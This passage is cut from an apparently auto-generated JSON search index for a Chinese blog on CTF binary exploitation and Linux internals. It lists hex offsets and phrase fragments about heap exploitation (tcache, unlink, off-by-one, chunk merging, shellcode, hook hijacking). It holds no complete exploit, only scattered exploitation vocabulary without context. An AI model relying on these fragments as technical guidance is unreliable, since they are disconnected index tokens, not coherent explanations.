}],[\"0x4012dc\",{\"1\":{\"473\":1}}],[\"0x4012d0\",{\"1\":{\"473\":1}}],[\"0x4012a0\",{\"1\":{\"473\":1}}],[\"0x401700^res\",{\"1\":{\"380\":1,\"502\":1}}],[\"0x400864\",{\"1\":{\"485\":1}}],[\"0x400000\",{\"1\":{\"469\":1}}],[\"0x400\",{\"1\":{\"368\":1,\"369\":1,\"491\":1}}],[\"0x48\",{\"1\":{\"378\":4,\"491\":1,\"500\":4,\"503\":1}}],[\"0x488\",{\"1\":{\"367\":1,\"369\":1}}],[\"0x480\",{\"1\":{\"365\":1,\"369\":1}}],[\"0x4f0\",{\"1\":{\"367\":1,\"369\":1}}],[\"0x431\",{\"1\":{\"367\":1,\"369\":1}}],[\"0x438\",{\"1\":{\"365\":1,\"369\":1}}],[\"0x430\",{\"1\":{\"365\":2,\"369\":2,\"491\":1}}],[\"0x420\",{\"1\":{\"357\":1,\"365\":2,\"369\":2}}],[\"0x86\",{\"1\":{\"484\":2}}],[\"0x8b\",{\"1\":{\"484\":1}}],[\"0x84\",{\"1\":{\"484\":2}}],[\"0x84420\",{\"1\":{\"397\":1}}],[\"0x8afc4\",{\"1\":{\"486\":1}}],[\"0x8a\",{\"1\":{\"484\":1}}],[\"0x87\",{\"1\":{\"484\":1}}],[\"0x88\",{\"1\":{\"484\":3}}],[\"0x81\",{\"1\":{\"484\":4}}],[\"0x8f\",{\"1\":{\"484\":1}}],[\"0x8d\",{\"1\":{\"484\":5}}],[\"0x89\",{\"1\":{\"484\":1}}],[\"0x85\",{\"1\":{\"484\":8}}],[\"0x80e50\",{\"1\":{\"491\":1}}],[\"0x80\",{\"1\":{\"483\":3,\"484\":1,\"488\":1}}],[\"0x800\",{\"1\":{\"397\":2}}],[\"0x80之类的\",{\"1\":{\"20\":1,\"162\":1}}],[\"0x8\",{\"1\":{\"329\":1,\"376\":1,\"479\":2,\"498\":1}}],[\"0x00006761\",{\"1\":{\"483\":1}}],[\"0x00006b4b\",{\"1\":{\"462\":1}}],[\"0x00001f11\",{\"1\":{\"462\":1}}],[\"0x0000177b\",{\"1\":{\"462\":1}}],[\"0x000040ce\",{\"1\":{\"462\":1}}],[\"0x00004506\",{\"1\":{\"462\":1}}],[\"0x00004ff3\",{\"1\":{\"462\":1}}],[\"0x000052fb\",{\"1\":{\"462\":1}}],[\"0x000055e22cd98a10+0x30+0x110\",{\"1\":{\"287\":1}}],[\"0x000029e3\",{\"1\":{\"462\":1}}],[\"0x00002989\",{\"1\":{\"462\":1}}],[\"0x000028b4\",{\"1\":{\"462\":1}}],[\"0x000028fa\",{\"1\":{\"462\":1}}],[\"0x00002a6f\",{\"1\":{\"462\":1}}],[\"0x00002b71\",{\"1\":{\"462\":1}}],[\"0x0000264f\",{\"1\":{\"462\":1}}],[\"0x00002f14\",{\"1\":{\"462\":1}}],[\"0x000032d8\",{\"1\":{\"462\":1}}],[\"0x000000ff\",{\"1\":{\"462\":1}}],[\"0x0000000f\",{\"1\":{\"462\":1}}],[\"0x0000007d\",{\"1\":{\"462\":1}}],[\"0x0000001d\",{\"1\":{\"462\":1}}],[\"0x00000014\",{\"1\":{\"462\":1}}],[\"0x0000005b\",{\"1\":{\"462\":1}}],[\"0x0000006d\",{\"1\":{\"462\":2}}],[\"0x0000004e\",{\"1\":{\"462\":2}}],[\"0x0\",{\"1\":{\"311\":13,\"397\":1,\"408\":40,\"475\":1,\"483\":1,\"491\":1}}],[\"0x9d\",{\"1\":{\"484\":1}}],[\"0x98\",{\"1\":{\"484\":1}}],[\"0x9c\",{\"1\":{\"484\":1}}],[\"0x9f\",{\"1\":{\"484\":1}}],[\"0x9a\",{\"1\":{\"484\":2}}],[\"0x94\",{\"1\":{\"484\":1}}],[\"0x96\",{\"1\":{\"484\":1}}],[\"0x9b\",{\"1\":{\"484\":2}}],[\"0x97\",{\"1\":{\"484\":4}}],[\"0x93\",{\"1\":{\"484\":5}}],[\"0x91\",{\"1\":{\"311\":1,\"503\":1}}],[\"0x90均存满\",{\"1\":{\"376\":1,\"498\":1}}],[\"0x90\",{\"1\":{\"311\":2,\"359\":1,\"484\":3}}],[\"0x1279d20\",{\"1\":{\"491\":2}}],[\"0x1279d00\",{\"1\":{\"491\":4}}],[\"0x120\",{\"1\":{\"488\":3}}],[\"0x1baf400\",{\"1\":{\"491\":1}}],[\"0x170\",{\"1\":{\"488\":1}}],[\"0x130\",{\"1\":{\"488\":1}}],[\"0x130+p64\",{\"1\":{\"488\":1}}],[\"0x138\",{\"1\":{\"488\":1}}],[\"0x1603000\",{\"1\":{\"491\":1}}],[\"0x1603d00\",{\"1\":{\"491\":1}}],[\"0x1603d20\",{\"1\":{\"491\":1}}],[\"0x160\",{\"1\":{\"483\":1}}],[\"0x14514420\",{\"1\":{\"483\":1}}],[\"0x14514400\",{\"1\":{\"483\":1}}],[\"0x14514009\",{\"1\":{\"483\":1}}],[\"0x14514000\",{\"1\":{\"483\":3}}],[\"0x11\",{\"1\":{\"503\":2}}],[\"0x110大小chunk\",{\"1\":{\"491\":1}}],[\"0x11451406a\",{\"1\":{\"483\":1}}],[\"0x114514061\",{\"1\":{\"483\":3}}],[\"0x11451404d\",{\"1\":{\"483\":1}}],[\"0x114514000\",{\"1\":{\"483\":1}}],[\"0x11u\",{\"1\":{\"459\":1,\"461\":1}}],[\"0x1ea0\",{\"1\":{\"503\":1}}],[\"0x1e8c60\",{\"1\":{\"397\":1}}],[\"0x1ed5c0\",{\"1\":{\"397\":1}}],[\"0x18位置改为我们要执行函数的地址\",{\"1\":{\"397\":1}}],[\"0x18位置写入我们要触发的函数\",{\"1\":{\"396\":1}}],[\"0x18的位置\",{\"1\":{\"345\":1}}],[\"0x18\",{\"1\":{\"296\":3,\"345\":1,\"358\":1,\"359\":1,\"373\":1,\"376\":2,\"378\":1,\"380\":1,\"397\":1,\"491\":5,\"495\":1,\"498\":2,\"500\":1,\"502\":1}}],[\"0x10588\",{\"1\":{\"486\":1}}],[\"0x101\",{\"1\":{\"483\":1}}],[\"0x108\",{\"1\":{\"368\":1,\"369\":1}}],[\"0x100+p64\",{\"1\":{\"488\":1}}],[\"0x1000\",{\"1\":{\"483\":1}}],[\"0x100\",{\"1\":{\"365\":2,\"368\":1,\"369\":3,\"377\":1,\"378\":1,\"380\":1,\"482\":1,\"483\":1,\"484\":1,\"488\":3,\"491\":1,\"499\":1,\"500\":1,\"502\":1,\"503\":4}}],[\"0x10时\",{\"1\":{\"325\":1}}],[\"0x10\",{\"1\":{\"287\":1,\"293\":1,\"296\":3,\"339\":1,\"345\":1,\"358\":2,\"359\":2,\"365\":1,\"368\":1,\"369\":2,\"488\":3,\"503\":1}}],[\"0x\",{\"1\":{\"290\":1,\"503\":1}}],[\"0xacf8a0\",{\"1\":{\"491\":1}}],[\"0xacf8c0\",{\"1\":{\"491\":1}}],[\"0xacf8e0\",{\"1\":{\"491\":1}}],[\"0xae4000\",{\"1\":{\"491\":1}}],[\"0xae4400\",{\"1\":{\"491\":1}}],[\"0xae\",{\"1\":{\"484\":1}}],[\"0xa6\",{\"1\":{\"484\":2}}],[\"0xa7\",{\"1\":{\"484\":1}}],[\"0xa4\",{\"1\":{\"484\":1}}],[\"0xad\",{\"1\":{\"484\":5}}],[\"0xa1\",{\"1\":{\"484\":1}}],[\"0xa5\",{\"1\":{\"484\":6}}],[\"0xaf\",{\"1\":{\"484\":5}}],[\"0xa8分别为可迁移的存放有rop的位置和ret指令的gadget位置\",{\"1\":{\"59\":1,\"199\":1}}],[\"0xa8\",{\"1\":{\"59\":1,\"199\":1}}],[\"0xa0\",{\"1\":{\"59\":2,\"199\":2,\"358\":2,\"359\":1,\"388\":1,\"396\":1,\"397\":2}}],[\"0x29\",{\"1\":{\"484\":1}}],[\"0x29dc0\",{\"1\":{\"473\":1,\"481\":1}}],[\"0x23\",{\"1\":{\"483\":2}}],[\"0x23就是32位运行模式\",{\"1\":{\"42\":1,\"182\":1}}],[\"0x28+pop\",{\"1\":{\"504\":1}}],[\"0x28+b\",{\"1\":{\"481\":1}}],[\"0x28c0\",{\"1\":{\"503\":1}}],[\"0x28\",{\"1\":{\"473\":1,\"483\":2,\"484\":1,\"505\":1}}],[\"0x28u\",{\"1\":{\"459\":1}}],[\"0x21\",{\"1\":{\"377\":1,\"378\":1,\"499\":1,\"500\":1}}],[\"0x20+p64\",{\"1\":{\"481\":1}}],[\"0x2072+0x78+baselibc\",{\"1\":{\"481\":1}}],[\"0x200\",{\"1\":{\"397\":3}}],[\"0x20c30\",{\"1\":{\"380\":1,\"502\":1}}],[\"0x20\",{\"1\":{\"290\":2,\"325\":1,\"357\":1,\"371\":1,\"376\":1,\"397\":4,\"473\":1,\"483\":2,\"484\":5,\"488\":3,\"491\":2,\"493\":1,\"498\":1}}],[\"0x22\",{\"1\":{\"44\":1,\"184\":1,\"483\":1}}],[\"033\",{\"1\":{\"397\":1}}],[\"03\",{\"1\":{\"40\":1,\"180\":1,\"273\":1,\"311\":2}}],[\"05\",{\"1\":{\"40\":1,\"180\":1,\"311\":2,\"346\":1}}],[\"08\",{\"1\":{\"40\":1,\"46\":1,\"180\":1,\"186\":1}}],[\"02\",{\"1\":{\"40\":1,\"180\":1,\"311\":2,\"346\":1}}],[\"0是标准输入\",{\"1\":{\"15\":2,\"157\":2}}],[\"0表示读取\",{\"1\":{\"13\":1,\"155\":1}}],[\"0\",{\"0\":{\"263\":1,\"485\":1,\"486\":1},\"1\":{\"13\":1,\"36\":2,\"47\":2,\"60\":1,\"74\":1,\"131\":9,\"155\":1,\"176\":2,\"187\":2,\"200\":1,\"214\":1,\"242\":2,\"243\":2,\"258\":2,\"261\":1,\"281\":2,\"290\":4,\"292\":1,\"296\":2,\"313\":1,\"321\":1,\"324\":12,\"339\":6,\"344\":1,\"345\":1,\"347\":2,\"351\":1,\"352\":4,\"353\":3,\"358\":7,\"359\":8,\"365\":7,\"366\":1,\"369\":6,\"373\":2,\"377\":1,\"378\":4,\"380\":4,\"390\":1,\"397\":4,\"403\":2,\"408\":25,\"410\":3,\"417\":1,\"426\":6,\"438\":1,\"439\":3,\"441\":1,\"442\":2,\"449\":4,\"458\":1,\"459\":9,\"461\":12,\"462\":3,\"463\":1,\"469\":2,\"470\":1,\"473\":3,\"479\":2,\"480\":2,\"481\":1,\"483\":4,\"485\":2,\"486\":2,\"488\":5,\"491\":5,\"495\":2,\"499\":1,\"500\":4,\"502\":4,\"503\":9,\"504\":1,\"505\":2}}],[\"0地址\",{\"1\":{\"12\":1,\"154\":1}}],[\"共126个bin\",{\"1\":{\"347\":1}}],[\"共同讨论\",{\"1\":{\"269\":1}}],[\"共同操作同一个内存页\",{\"1\":{\"13\":1,\"155\":1}}],[\"共享文件\",{\"1\":{\"13\":1,\"155\":1}}],[\"进入open64\",{\"0\":{\"405\":1}}],[\"进入\",{\"1\":{\"292\":1}}],[\"进入后使用apt发生报错\",{\"1\":{\"261\":1}}],[\"进入docker\",{\"1\":{\"258\":1}}],[\"进行修改一些已经进入bin链的chunk\",{\"1\":{\"488\":1}}],[\"进行覆写\",{\"1\":{\"380\":1,\"502\":1}}],[\"进行异或操作\",{\"1\":{\"378\":1,\"500\":1}}],[\"进行2\",{\"1\":{\"324\":1}}],[\"进行unlink操作\",{\"1\":{\"321\":1,\"324\":1}}],[\"进行内存释放时\",{\"1\":{\"284\":1}}],[\"进行hook\",{\"1\":{\"134\":1}}],[\"进行的返回\",{\"1\":{\"47\":1,\"187\":1}}],[\"进行调用\",{\"1\":{\"42\":1,\"182\":1}}],[\"进行通信\",{\"1\":{\"13\":1,\"155\":1}}],[\"进程已经使用的物理内存页面数\",{\"1\":{\"69\":1,\"209\":1}}],[\"进程是资源\",{\"1\":{\"66\":1,\"206\":1}}],[\"进程\",{\"0\":{\"66\":1,\"206\":1},\"1\":{\"66\":1,\"206\":1}}],[\"进程可用的系统调用就只有4个\",{\"1\":{\"41\":1,\"181\":1}}],[\"进程之间文件描述符相互独立\",{\"1\":{\"15\":1,\"157\":1}}],[\"进程间通信\",{\"1\":{\"13\":1,\"155\":1}}],[\"读题\",{\"0\":{\"301\":1}}],[\"读取了flag而且写入了chunk中再把chunk\",{\"1\":{\"484\":1}}],[\"读取客户端的消息\",{\"1\":{\"254\":1}}],[\"读取后\",{\"1\":{\"13\":1,\"155\":1}}],[\"读操作同理\",{\"1\":{\"13\":1,\"155\":1}}],[\"读写进程共同操作内核中的数据缓冲区\",{\"1\":{\"13\":1,\"155\":1}}],[\"若条件不允许写\",{\"1\":{\"13\":1,\"155\":1}}],[\"若有缓冲区可写\",{\"1\":{\"13\":1,\"155\":1}}],[\"即此数组表示的是各种大小内存对应的链表头部\",{\"1\":{\"438\":1}}],[\"即前一个\",{\"1\":{\"312\":1}}],[\"即可完成劫持\",{\"1\":{\"306\":1}}],[\"即使未链接stdin\",{\"1\":{\"258\":1}}],[\"即别重写\",{\"1\":{\"252\":1}}],[\"即读进程\",{\"1\":{\"13\":1,\"155\":1}}],[\"即写进程\",{\"1\":{\"13\":1,\"155\":1}}],[\"又称互素在数论中\",{\"1\":{\"240\":1}}],[\"又称素数\",{\"1\":{\"240\":1}}],[\"又称\",{\"1\":{\"13\":1,\"155\":1}}],[\"以下是一些常见的git代码提交规范\",{\"1\":{\"263\":1}}],[\"以防止跨站点请求伪造\",{\"1\":{\"254\":1}}],[\"以便于交互\",{\"1\":{\"120\":1}}],[\"以后有需要了\",{\"1\":{\"68\":1,\"208\":1}}],[\"以及value的部分\",{\"1\":{\"461\":1}}],[\"以及最容易理解错的是\",{\"1\":{\"446\":1}}],[\"以及我们发现这里调用的是\",{\"1\":{\"395\":1}}],[\"以及chunk5\",{\"1\":{\"367\":1}}],[\"以及指针原本的位置\",{\"1\":{\"358\":1,\"359\":1}}],[\"以及\",{\"1\":{\"325\":1}}],[\"以及内存对齐\",{\"1\":{\"324\":1}}],[\"以及git\",{\"1\":{\"273\":1}}],[\"以及对应的解决方法\",{\"1\":{\"258\":1}}],[\"以及其他的复杂检查\",{\"1\":{\"317\":1}}],[\"以及其全部相关的业务逻辑\",{\"1\":{\"252\":1}}],[\"以及其实直接向0输出也是可以的\",{\"1\":{\"18\":1,\"160\":1}}],[\"以及这样的设计模式对中小型框架是不合适的通常花费大量时间去划分板块换取的效益并不大在中小框架中\",{\"1\":{\"246\":1}}],[\"以及一些小技巧\",{\"1\":{\"244\":1}}],[\"以及存储了虚表指针\",{\"1\":{\"77\":1,\"217\":1}}],[\"以及理顺一些脉络\",{\"1\":{\"62\":1,\"202\":1}}],[\"以及bk然后chunk2就为我们要劫持的chunk\",{\"1\":{\"55\":1,\"195\":1}}],[\"以及知识点体系过于庞大\",{\"1\":{\"53\":1,\"193\":1}}],[\"以字符流形式将大量的数据送入管道\",{\"1\":{\"13\":1,\"155\":1}}],[\"以实现它们之间通信的共享文件\",{\"1\":{\"13\":1,\"155\":1}}],[\"以前采用\",{\"1\":{\"9\":1,\"151\":1}}],[\"是一个特殊的\",{\"1\":{\"466\":1}}],[\"是一个用于分割字段的字符列表\",{\"1\":{\"465\":1}}],[\"是一个或多个文件名\",{\"1\":{\"464\":1}}],[\"是一种文本编辑器\",{\"1\":{\"464\":1}}],[\"是一种比线程更加轻量级的存在\",{\"1\":{\"23\":1,\"165\":1}}],[\"是一种计算机程序设计领域的优化策略\",{\"1\":{\"8\":1,\"150\":1}}],[\"是调用\",{\"1\":{\"458\":1}}],[\"是类似\",{\"1\":{\"435\":1}}],[\"是缓冲区起始位置\",{\"1\":{\"426\":1}}],[\"是作为全局变量储存在\",{\"1\":{\"422\":1}}],[\"是不能被销毁的\",{\"1\":{\"353\":1}}],[\"是bins的一个缓冲区\",{\"1\":{\"347\":1}}],[\"是决定是我们的操作\",{\"1\":{\"333\":1}}],[\"是free状态\",{\"1\":{\"324\":1}}],[\"是3\",{\"1\":{\"262\":1}}],[\"是小于或等于n的正整数中与n互质的数的数目\",{\"1\":{\"240\":1}}],[\"是否切割后的chunk大于minsize\",{\"1\":{\"321\":1}}],[\"是否正在使用的标志位为1\",{\"1\":{\"312\":1}}],[\"是否等于当前的chunk\",{\"1\":{\"312\":1}}],[\"是否可以使用debug调试\",{\"1\":{\"141\":1}}],[\"是否给用户删除数据的权限\",{\"1\":{\"141\":1}}],[\"是否有类似项目\",{\"1\":{\"109\":1}}],[\"是否能共享\",{\"1\":{\"77\":1,\"217\":1}}],[\"是驱动通过alloc\",{\"1\":{\"79\":1,\"219\":1}}],[\"是和物理内存一一对应的\",{\"1\":{\"70\":1,\"210\":1}}],[\"是先将程序头写入进入新的内存\",{\"1\":{\"67\":1,\"207\":1}}],[\"是利用的r寄存器\",{\"1\":{\"47\":1,\"187\":1}}],[\"是通过hash链表\",{\"1\":{\"25\":1,\"167\":1}}],[\"是因为在内核中共同指向了同一个pipe\",{\"1\":{\"13\":1,\"155\":1}}],[\"是指用于连接一个读进程和一个写进程\",{\"1\":{\"13\":1,\"155\":1}}],[\"49979\",{\"1\":{\"503\":1}}],[\"456\",{\"1\":{\"483\":1}}],[\"48\",{\"1\":{\"480\":1}}],[\"4h\",{\"1\":{\"469\":1,\"470\":1}}],[\"44\",{\"1\":{\"469\":1}}],[\"44106885765559411\",{\"1\":{\"243\":1}}],[\"4的2mb\",{\"1\":{\"438\":1}}],[\"4+p64\",{\"1\":{\"380\":1,\"502\":1}}],[\"4096\",{\"1\":{\"504\":1}}],[\"40h\",{\"1\":{\"459\":1}}],[\"40\",{\"1\":{\"292\":4}}],[\"403fa820f3bc49c2fdf37a4f0419fac2\",{\"1\":{\"273\":1}}],[\"4007f4\",{\"1\":{\"470\":1}}],[\"400\",{\"1\":{\"261\":6}}],[\"41348000h\",{\"1\":{\"470\":1}}],[\"413\",{\"1\":{\"261\":1}}],[\"41\",{\"1\":{\"261\":1,\"470\":1}}],[\"4gb\",{\"1\":{\"71\":1,\"211\":1}}],[\"4page\",{\"1\":{\"50\":1,\"190\":1}}],[\"4page就申请page\",{\"1\":{\"50\":1,\"190\":1}}],[\"4\",{\"1\":{\"23\":1,\"30\":4,\"50\":2,\"63\":1,\"68\":1,\"71\":2,\"165\":1,\"172\":4,\"190\":2,\"203\":1,\"208\":1,\"211\":2,\"244\":1,\"252\":1,\"258\":2,\"261\":1,\"365\":1,\"368\":3,\"369\":4,\"380\":1,\"389\":1,\"397\":1,\"461\":1,\"462\":1,\"464\":1,\"471\":1,\"473\":1,\"475\":1,\"479\":1,\"480\":1,\"481\":1,\"482\":3,\"483\":1,\"484\":2,\"486\":1,\"488\":2,\"491\":4,\"502\":1,\"503\":4,\"504\":1,\"505\":1}}],[\"423964093\",{\"1\":{\"13\":1,\"155\":1}}],[\"43\",{\"1\":{\"1\":1}}],[\"系列主题\",{\"1\":{\"252\":1}}],[\"系列\",{\"1\":{\"13\":1,\"155\":1}}],[\"系统默认系统之前查找\",{\"1\":{\"453\":1}}],[\"系统其实给我们的是一样的chunk大小\",{\"1\":{\"330\":1}}],[\"系统调用创建\",{\"1\":{\"43\":1,\"183\":1}}],[\"系统调用\",{\"1\":{\"41\":1,\"181\":1,\"454\":1,\"458\":1}}],[\"系统运行中断情况监控图\",{\"1\":{\"19\":1,\"161\":1}}],[\"系统需要花费额外的操作去读取\",{\"1\":{\"12\":1,\"154\":1}}],[\"系统才会真正复制一份专用副本\",{\"1\":{\"8\":1,\"150\":1}}],[\"最终调用open\",{\"1\":{\"420\":1}}],[\"最终跑了一晚上才跑出来\",{\"1\":{\"380\":1,\"502\":1}}],[\"最终让fd和bk写上了main\",{\"1\":{\"360\":1}}],[\"最难崩的一步\",{\"1\":{\"380\":1,\"502\":1}}],[\"最消耗时间的一步\",{\"1\":{\"374\":1,\"496\":1}}],[\"最简单的一步\",{\"1\":{\"373\":1,\"495\":1}}],[\"最简单的结构\",{\"1\":{\"329\":1}}],[\"最先是896mb\",{\"1\":{\"70\":1,\"210\":1}}],[\"最后成功\",{\"1\":{\"471\":1}}],[\"最后就是检查input是否为flag了\",{\"1\":{\"460\":1}}],[\"最后就是执行入链操作了\",{\"1\":{\"319\":1}}],[\"最后我们直接在程序源代码重找cmp的部分找到了\",{\"1\":{\"470\":1}}],[\"最后我们jmp过去\",{\"1\":{\"449\":1}}],[\"最后我们free\",{\"1\":{\"302\":1}}],[\"最后只需要\",{\"1\":{\"368\":1}}],[\"最后的malloc变为malloc一个更小的chunk\",{\"1\":{\"359\":1}}],[\"最后被赋值victim\",{\"1\":{\"325\":1}}],[\"最后再回来\",{\"1\":{\"48\":1,\"188\":1}}],[\"最后留下的两块数据合并放入寄存器\",{\"1\":{\"12\":1,\"154\":1}}],[\"最重要的是\",{\"1\":{\"23\":1,\"165\":1}}],[\"最小chunk为0x20\",{\"1\":{\"289\":1}}],[\"最小的那个chunk\",{\"1\":{\"57\":1,\"197\":1}}],[\"最小\",{\"1\":{\"16\":1,\"158\":1}}],[\"最近没有使用的内存页面释放暂时写在硬盘上\",{\"1\":{\"10\":1,\"152\":1}}],[\"53647\",{\"1\":{\"505\":1}}],[\"53235\",{\"1\":{\"479\":1}}],[\"50\",{\"1\":{\"504\":1}}],[\"50176\",{\"1\":{\"485\":1}}],[\"57621\",{\"1\":{\"486\":1}}],[\"57次\",{\"1\":{\"483\":1}}],[\"52689\",{\"1\":{\"484\":1}}],[\"52pojie\",{\"1\":{\"140\":1}}],[\"557bbe9bf2e9\",{\"1\":{\"460\":1}}],[\"557bbe9bf803\",{\"1\":{\"459\":1}}],[\"557bbe9c22c0\",{\"1\":{\"459\":1}}],[\"557bbe9c22a0\",{\"1\":{\"459\":1}}],[\"557bbe9c2280\",{\"1\":{\"459\":1,\"460\":2}}],[\"5触发合并机制\",{\"1\":{\"368\":1}}],[\"5的prev\",{\"1\":{\"368\":1}}],[\"5出来\",{\"1\":{\"367\":1}}],[\"5版本\",{\"1\":{\"262\":1}}],[\"512mb代码段\",{\"1\":{\"70\":1,\"210\":1}}],[\"511\",{\"1\":{\"50\":1,\"190\":1}}],[\"5\",{\"1\":{\"12\":1,\"41\":1,\"50\":1,\"54\":1,\"66\":1,\"154\":1,\"181\":1,\"190\":1,\"194\":1,\"206\":1,\"244\":1,\"261\":1,\"292\":1,\"365\":1,\"367\":2,\"368\":1,\"369\":3,\"373\":1,\"378\":2,\"380\":1,\"397\":1,\"436\":1,\"459\":1,\"461\":2,\"464\":3,\"488\":1,\"491\":2,\"495\":1,\"500\":2,\"502\":1,\"503\":3}}],[\"同理设计为ptr\",{\"1\":{\"345\":1}}],[\"同一个大小的chunk通过fd\",{\"1\":{\"308\":1}}],[\"同一个地址\",{\"1\":{\"287\":1}}],[\"同一个文件\",{\"1\":{\"15\":1,\"157\":1}}],[\"同一个文件描述符指向\",{\"1\":{\"15\":1,\"157\":1}}],[\"同样的做法也可以解决下面出现的通讯混乱\",{\"1\":{\"245\":1}}],[\"同样剔除不要的数据\",{\"1\":{\"12\":1,\"154\":1}}],[\"同步访问互斥锁\",{\"1\":{\"347\":1}}],[\"同步方式\",{\"1\":{\"126\":1}}],[\"同步性\",{\"1\":{\"13\":1,\"155\":1}}],[\"同时这样会导致model层业务逻辑模糊\",{\"1\":{\"252\":1}}],[\"同时mvc由于板块之间分离\",{\"1\":{\"246\":1}}],[\"同时也等价为\",{\"1\":{\"240\":1}}],[\"同时还规定系统刚刚启动的时候\",{\"1\":{\"15\":2,\"157\":2}}],[\"同时请求相同资源\",{\"1\":{\"8\":1,\"150\":1}}],[\"剔除不想要的字节\",{\"1\":{\"12\":1,\"154\":1}}],[\"要free的是\",{\"1\":{\"491\":1}}],[\"要实现tcache满\",{\"1\":{\"488\":1}}],[\"要等待的线程标识符\",{\"1\":{\"458\":1}}],[\"要大于minsize\",{\"1\":{\"324\":1}}],[\"要hook的函数偏移\",{\"1\":{\"127\":1}}],[\"要hook的函数\",{\"1\":{\"123\":1}}],[\"要hook的代码\",{\"1\":{\"123\":1}}],[\"要先从0地址开始读取第一个4字节块\",{\"1\":{\"12\":1,\"154\":1}}],[\"要是不对齐的话\",{\"1\":{\"12\":1,\"154\":1}}],[\"不懂为什么这题就只有30多解\",{\"1\":{\"484\":1}}],[\"不清空屏幕\",{\"1\":{\"464\":1}}],[\"不折行长行\",{\"1\":{\"464\":1}}],[\"不太稳定\",{\"1\":{\"456\":1}}],[\"不去修改p\",{\"1\":{\"337\":1}}],[\"不轻易改变chunk\",{\"1\":{\"321\":1}}],[\"不符\",{\"1\":{\"312\":1}}],[\"不大于\",{\"1\":{\"284\":1}}],[\"不然会出问题\",{\"1\":{\"275\":1}}],[\"不能小于2\",{\"1\":{\"312\":1}}],[\"不能以后每次都这样操作\",{\"1\":{\"272\":1}}],[\"不能被其他自然数整除\",{\"1\":{\"240\":1}}],[\"不应该让多个类之间的依赖混乱化\",{\"1\":{\"252\":1}}],[\"不要覆盖包含具体实现的函数\",{\"1\":{\"252\":1}}],[\"不要在具体实现类上创建衍生类\",{\"1\":{\"252\":1}}],[\"不管是实例方法还是静态方法都可以\",{\"1\":{\"121\":1}}],[\"不允许申请null地址\",{\"1\":{\"74\":1,\"214\":1}}],[\"不需要和32位一样精细规划\",{\"1\":{\"70\":1,\"210\":1}}],[\"不确定会带来一些难以想象的后果\",{\"1\":{\"66\":1,\"206\":1}}],[\"不同的参数列表\",{\"1\":{\"123\":1}}],[\"不同的进程之间\",{\"1\":{\"15\":1,\"157\":1}}],[\"不同的进程是可以让虚拟地址共同映射到同一块物理内存地址的\",{\"1\":{\"11\":1,\"153\":1}}],[\"不同大小的内存可能会分配在多个连续的page\",{\"1\":{\"50\":1,\"190\":1}}],[\"不会影响原对象的值\",{\"1\":{\"30\":1,\"172\":1}}],[\"不修改就不拷贝\",{\"1\":{\"8\":1,\"150\":1}}],[\"然后glibc\",{\"1\":{\"491\":1}}],[\"然后got\",{\"1\":{\"36\":1,\"176\":1}}],[\"然后让这些chunk合并进入unsortedbin\",{\"1\":{\"490\":1}}],[\"然后让rel\",{\"1\":{\"36\":1,\"176\":1}}],[\"然后一个content\",{\"1\":{\"489\":1}}],[\"然后一个属性为data也就是数据本身\",{\"1\":{\"401\":1}}],[\"然后ac都为unsortedbin\",{\"1\":{\"488\":1}}],[\"然后add\",{\"1\":{\"367\":1}}],[\"然后shellcode\",{\"1\":{\"486\":1}}],[\"然后sp减去一定值\",{\"1\":{\"48\":1,\"188\":1}}],[\"然后sp展开\",{\"1\":{\"47\":1,\"187\":1}}],[\"然后到bss端执行shellcode\",{\"1\":{\"485\":1}}],[\"然后输出chunk内容\",{\"1\":{\"487\":1}}],[\"然后输出\",{\"1\":{\"484\":1}}],[\"然后把shellcode\",{\"1\":{\"483\":1}}],[\"然后发现跳转到执行shellcode的地方的时候寄存器上已经几乎布置好了一些我们需要的值\",{\"1\":{\"482\":1}}],[\"然后发生报错\",{\"1\":{\"131\":1}}],[\"然后第二次通过scanf来向目标地址写入数据\",{\"1\":{\"476\":1}}],[\"然后第二个chunk要在\",{\"1\":{\"396\":1}}],[\"然后前六个参数都是寄存器\",{\"1\":{\"476\":1}}],[\"然后触发rep\",{\"1\":{\"482\":1}}],[\"然后触发system函数\",{\"1\":{\"473\":1}}],[\"然后触发合并\",{\"1\":{\"376\":2,\"498\":2}}],[\"然后分别开启四个函数\",{\"1\":{\"460\":1}}],[\"然后分析即可\",{\"1\":{\"144\":1}}],[\"然后分析一下两个参数\",{\"1\":{\"36\":1,\"176\":1}}],[\"然后准备对应环境\",{\"1\":{\"454\":1}}],[\"然后执行指令ret\",{\"1\":{\"446\":1}}],[\"然后这里涉及到了udp和tcp\",{\"1\":{\"433\":1}}],[\"然后这个东西被getcursorposition调用的\",{\"1\":{\"136\":1}}],[\"然后后面的通过\",{\"1\":{\"417\":1}}],[\"然后后面通过栈传递\",{\"1\":{\"47\":1,\"187\":1}}],[\"然后各种回调函数属性\",{\"1\":{\"401\":1}}],[\"然后会触发检查vatble是否合法\",{\"1\":{\"394\":1}}],[\"然后指向exit\",{\"1\":{\"380\":1,\"502\":1}}],[\"然后write直接泄露即可\",{\"1\":{\"373\":1,\"495\":1}}],[\"然后申请回来利用chunk中保留有关libc和heap的地址然后推算出libc基地址和heap基地址\",{\"1\":{\"373\":1,\"495\":1}}],[\"然后利用off\",{\"1\":{\"366\":1}}],[\"然后合成一个0x860的大chunk\",{\"1\":{\"365\":1,\"369\":1}}],[\"然后修改思路\",{\"1\":{\"359\":1}}],[\"然后malloc一个较大的chunk\",{\"1\":{\"376\":1,\"498\":1}}],[\"然后malloc回来\",{\"1\":{\"368\":1}}],[\"然后malloc\",{\"1\":{\"358\":1}}],[\"然后malloc要回来\",{\"1\":{\"357\":1}}],[\"然后malloc的时候malloc一个超大值让它刚好到我们想要控制的地址附近去\",{\"1\":{\"56\":1,\"196\":1}}],[\"然后加锁进行分配\",{\"1\":{\"349\":1}}],[\"然后加锁分配\",{\"1\":{\"349\":1}}],[\"然后加上偏移地址获取真正的地址\",{\"1\":{\"21\":1,\"163\":1}}],[\"然后那么根据源码最终ptr会指向fd也就是ptr\",{\"1\":{\"345\":1}}],[\"然后多的一个字节为0的话\",{\"1\":{\"345\":1}}],[\"然后fastbin中存在\",{\"1\":{\"488\":1}}],[\"然后fd\",{\"1\":{\"344\":1}}],[\"然后free第二个chunk\",{\"1\":{\"378\":1,\"500\":1}}],[\"然后free掉\",{\"1\":{\"372\":1,\"494\":1}}],[\"然后free\",{\"1\":{\"302\":2,\"358\":1}}],[\"然后根据add函数的逻辑\",{\"1\":{\"357\":1}}],[\"然后根据源码\",{\"1\":{\"339\":1}}],[\"然后根据docker从0搭建ubuntu16\",{\"1\":{\"262\":1}}],[\"然后此时chunk1的fd指向chunk2然后我们再次free\",{\"1\":{\"339\":1}}],[\"然后从top\",